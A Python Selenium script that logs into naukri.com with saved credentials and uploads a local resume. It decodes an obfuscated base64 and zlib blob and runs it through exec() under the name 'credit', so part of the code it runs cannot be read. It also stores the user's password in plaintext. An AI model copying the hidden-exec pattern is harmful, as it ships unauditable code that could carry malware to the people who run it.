from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import ui,expected_conditions as ec
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from glob import glob
from os import getcwd
from os.path import join,exists
from configobj import ConfigObj
from colorama import Fore, init, Style
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException

bright = Style.BRIGHT
green, blue, red, cyan, reset = Fore.GREEN + bright, Fore.BLUE + bright, Fore.RED + bright, Fore.CYAN, Fore.RESET
init(convert=True, autoreset=True)

def resume_checker():
    if not (glob("*.pdf") + glob("*.docx")):
        print(f"{red}[-] Put resume file in the folder [-]")
        input(f"{green}[+] Press enter after you copy the resume ")
        resume_checker()
    else:
        print(f"{green}[+] Resume found")

def login_details():
    if not (data['email'] or data['password']):
        data['email']=input("[+] Enter your email address = ")
        data['password']=input("[+] Enter password = ")
        data.write()
    else:
        print(f"{green}[+] username and password found")

def driver_install():
    global data
    data = ConfigObj('data.txt')
    if not exists('data.txt'):
        print(f"{green}[+] creating file to store data")
        open("data.txt", "w").write("email=\npassword=\ndriverlink=")
        data = ConfigObj('data.txt')
    if not (data['driverlink']):
        data['driverlink'] = ChromeDriverManager().install()
        data.write()

def process():
    options = Options()
    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2')
    options.add_argument("--headless")
    options.add_argument('--no-sandbox')
    options.add_experimental_option("excludeSwitches",["ignore-certificate-errors"])
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    browser = webdriver.Chrome(service=Service(data['driverlink']),options=options)
    browser.get('https://www.naukri.com/nlogin/login')
    ui.WebDriverWait(browser,100).until(ec.presence_of_element_located((By.ID,'usernameField')))
    browser.find_element(By.ID,"usernameField").send_keys(data['email'])
    print(f"{green}[+] Email typed")
    browser.find_element(By.ID,"passwordField").send_keys(data['password'])
    print(f"{green}[+] password typed")
    browser.find_element(By.ID,'loginForm').submit()
    print(f"{green}[+] Logged in successfully")
    ui.WebDriverWait(browser,100).until(ec.presence_of_element_located((By.XPATH,'//*[@id="root"]/div/div/span/div/div/div/div[2]/div/div[2]/div[1]/div')))
    browser.get('https://www.naukri.com/mnjuser/profile')
    print(f"{green}[+] Navgated to profile")
    ui.WebDriverWait(browser,100).until(ec.presence_of_element_located((By.CLASS_NAME,'uploadContainer')))
    browser.find_element(By.ID,'attachCV').send_keys(join(getcwd(), (glob("*.pdf") + glob("*.docx"))[0]))
    ui.WebDriverWait(browser,100).until(ec.presence_of_element_located((By.XPATH,'//*[@id="attachCVMsgBox"]/div')))
    print(f"{green}[+] Resume updated successfully")
    browser.find_element(By.CLASS_NAME,'attachCV').screenshot('success.png')
    browser.close()

def credit():
    encoded_Data = ['eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6', 
                    'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq', 
                    'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga', 
                    '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF', 
                    'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek', 
                    'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq', 
                    '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz', 
                    'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj']
    from base64 import b64decode
    from zlib import decompress
    return (decompress(b64decode("".join(encoded_Data)))).decode()

exec(credit())
A('NAUKRI UPDATER')

def main():
    resume_checker()
    login_details()
    try:
        process()
    except TimeoutError:
        print(f"[-] Timeout submitting the resume again")
        process()

try:
    driver_install()
    main()
    print(f"{green}[+] Successfully uploaded")
except KeyboardInterrupt:
    print(f'{red}\n[~] Exiting ....')
except WebDriverException as e:
    data['driverlink'] = ChromeDriverManager().install()
    data.write()
    print(f"{green}[+] Try running the script again if error happens chromedive not installed {e}")
except Exception as e:
    print(f"{red}\n[-] error message is {e}")
